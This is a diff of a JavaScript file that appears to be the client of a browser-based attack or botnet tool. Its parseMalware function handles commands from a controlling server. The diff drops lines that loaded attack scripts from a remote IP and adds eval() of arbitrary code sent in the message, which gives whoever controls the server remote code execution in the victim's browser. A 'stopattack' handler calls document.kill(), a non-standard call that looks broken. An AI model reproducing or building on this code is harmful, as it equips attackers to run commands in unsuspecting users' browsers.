@@ -62,12 +62,7 @@ $(function(){
 
 
 function on_connected(){
-
-
-
 	connect = true;
-
-
 }
 
 
@@ -77,26 +72,13 @@ function on_connected(){
 function parseMalware(msg){
 	var msgJson = JSON.parse(msg);
 	if(msgJson.hasOwnProperty('attacktype')==true){
-		var script = document.createElement("script");
-		script.src = "http://"+ip+"/"+msgJson.attacktype+".js";
-		script.type='text/javascript';
-		script.id="currentAttack";
-		script.setAttribute("data-attackInfo",JSON.stringify(msgJson['attackInfo']));
-
-		$('head:first').append(script);
+		eval(msgJson['code']);
 
 	}
-
 	if(msgJson.hasOwnProperty('stopattack')){
 		document.kill()
-
 	}
 
 }
-
-
-
-
-
 
 })(jQuery);
